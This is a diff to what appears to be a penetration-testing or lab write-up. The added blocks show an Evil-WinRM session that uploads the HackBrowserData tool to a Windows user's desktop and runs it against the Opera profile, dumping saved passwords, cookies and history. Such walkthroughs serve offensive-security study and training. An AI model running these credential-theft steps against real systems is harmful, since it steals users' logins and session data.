@@ -794,11 +794,22 @@ https://github.com/moonD4rk/HackBrowserData
 Ill download the latest release for windows x64
 
 ```python
-
+*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop> upload hack-browser-data.exe
+                                        
+Info: Uploading /home/kali/hsm/novaforge/hack-browser-data.exe to C:\Users\daniel.brooks\Desktop\hack-browser-data.exe
+                                        
+Data: 14959956 bytes of 14959956 bytes copied
+                                        
+Info: Upload successful!
 ```
 
 Ill upload it via WINRM
 
 ```python
-
+*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop> .\hack-browser-data.exe -d . -b opera -p "C:\Users\daniel.brooks\AppData\Roaming\Opera Software\Opera Stable"
+hack-browser-data.exe : [INF] Extracting Opera...
+    + CategoryInfo          : NotSpecified: ([INF] Extracting Opera...:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[INF] Exported to ./[INF]   password.json            3 entries[INF]   cookie.json              3 entries[INF]   history.json             12 entries[INF]   bookmark.json            1 entries[INF]   exten
 ```
+
